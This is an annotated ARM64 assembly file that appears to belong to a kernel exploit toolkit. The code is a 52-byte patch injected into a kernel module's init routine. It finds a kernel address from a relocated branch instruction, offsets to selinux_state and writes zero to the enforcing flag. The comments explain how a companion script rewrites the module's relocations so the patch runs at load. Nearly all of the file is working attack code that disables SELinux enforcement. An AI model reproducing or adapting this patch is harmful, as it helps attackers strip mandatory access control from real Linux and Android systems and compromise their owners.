// Reference for the 52-byte carrier init patch embedded as PATCH_INIT in orchestrate.py.
// Relocation-free enforcing=0: reuse the module's own init `bl <anchor>` (kept at .init.text+0x14,
// kernel relocates it via CALL26) as a live kernel-address anchor; decode its imm26 -> anchor addr;
// add DELTA (=selinux_state - anchor) -> selinux_state; strb wzr (enforcing@+0). movz/movk (0x1c/0x20)
// are patched per-target from delta_selinux_from_anchor. orchestrate.py also repoints the module's
// single .init.text CALL26 reloc to 0x14 and NONEs the other init relocs.
    paciasp                     // 0x00  landing pad + sign lr
    adr   x1, anchor            // 0x04
    ldr   w2, [x1]              // 0x08  relocated bl word
    sbfx  x2, x2, #0, #26       // 0x0c  imm26 sign-extend
    b     skip                  // 0x10
anchor:
    bl    0                     // 0x14  CALL26 -> anchor symbol (never executed)
skip:
    add   x1, x1, w2, sxtw #2   // 0x18  = anchor addr
    movz  x2, #0                // 0x1c  DELTA low   (patched)
    movk  x2, #0, lsl #16       // 0x20  DELTA high  (patched)
    add   x1, x1, x2            // 0x24  = selinux_state
    strb  wzr, [x1]             // 0x28  enforcing = 0
    autiasp                     // 0x2c
    ret                         // 0x30
